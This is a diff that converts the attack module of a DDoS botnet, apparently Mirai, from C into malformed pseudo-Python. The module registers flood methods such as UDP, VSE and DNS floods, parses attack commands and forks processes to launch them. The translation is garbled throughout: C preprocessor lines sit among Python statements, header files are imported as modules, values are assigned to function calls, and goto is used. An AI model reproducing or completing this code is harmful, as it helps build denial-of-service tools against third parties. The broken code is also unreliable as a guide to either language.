@@ -2,22 +2,33 @@ import os
 _GNU_SOURCE	= #ifdef DEBUG
 import sys
 #endif
-#include <unistd.h>
-#include <signal.h>
-#include <errno.h>
+# import <unistd.h>
+# import <signal.h>
+# import <errno.h>
 
-#include "includes.h"
-#include "attack.h"
-#include "rand.h"
-#include "util.h"
-#include "scanner.h"
+import includes.h.header
+import attack.h.header
+from attack.h.header import *
+import rand.h.header
+import util.h.header
+import scanner.h.header
 
+attack_target = attack.h.header.attack_target
+attack_option = attack.h.header.attack_option
+attack_method = attack.h.header.attack_method
+attack_stomp_data = attack.h.header.attack_stomp_data
+attack_http_state = attack.h.header.attack_http_state
+attack_cfnull_state = attack.h.header.attack_cfnull_state
+add_attack = attack.h.header.add_attack
+free_opts = attack.h.header.free_opts
 
 methods_len = 0
-struct attack_method **methods = NULL;attack_ongoing = (0)
+# struct attack_method **methods = NULL;attack_ongoing = (0)
+#
+# BOOL attack_init(void)
 
-BOOL attack_init(void)
-
+# attack_init = True
+def attack_init():
     add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic)
     add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse)
     add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns)
@@ -51,9 +62,12 @@ def attack_kill_all():
 #endif
 
 def attack_parse(buf, len):
-    ATTACK_VECTOR vector
-    struct attack_target *targs = NULL
-    struct attack_option *opts = NULL
+    # attack_method.ATTACK_VECTOR vector
+    attack_method.ATTACK_VECTOR(vector)
+    # struct attack_target *targs = NULL
+    # struct attack_option *opts = NULL
+    attack_target(targs) = NULL
+    attack_option(opts) = NULL
 
     # Read in attack duration uint32_t
     if len < sizeof (uint32_t):
@@ -65,7 +79,7 @@ def attack_parse(buf, len):
     # Read in attack ID uint8_t
     if len == 0:
         goto cleanup
-    vector = (ATTACK_VECTOR)*buf += 1
+    vector = (attack_method.ATTACK_VECTOR(buf += 1))
     len -= sizeof (uint8_t)
 
     # Read in target count uint8_t
@@ -129,7 +143,7 @@ def attack_parse(buf, len):
     if opts != NULL:
         free_opts(opts, opts_len)
 
-def attack_start(duration, ATTACK_VECTOR vector, targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_start(duration, attack_method.ATTACK_VECTOR vector, targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
 
     pid1 = os.fork()
     if pid1 == -1 or pid1 > 0:
@@ -179,13 +193,14 @@ def attack_get_opt_ip(opts_len, struct attack_option *opts, opt, def):
     else:
         return inet_addr(val)
 
-def add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func):
-    struct attack_method *method = calloc(1, sizeof (struct attack_method))
-
+def add_attack(attack_method.ATTACK_VECTOR, vector, ATTACK_FUNC(func)):
+    # struct attack_method *method = calloc(1, sizeof (struct attack_method))
+    method = calloc(1, sizeof(attack_method))
+    attack_method(method)
     method.vector = vector
     method.func = func
 
-    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *))
+    methods = realloc(methods, (methods_len + 1) * sizeof (attack_method))
     methods[methods_len++] = method
 
 def free_opts(struct attack_option *opts, len):
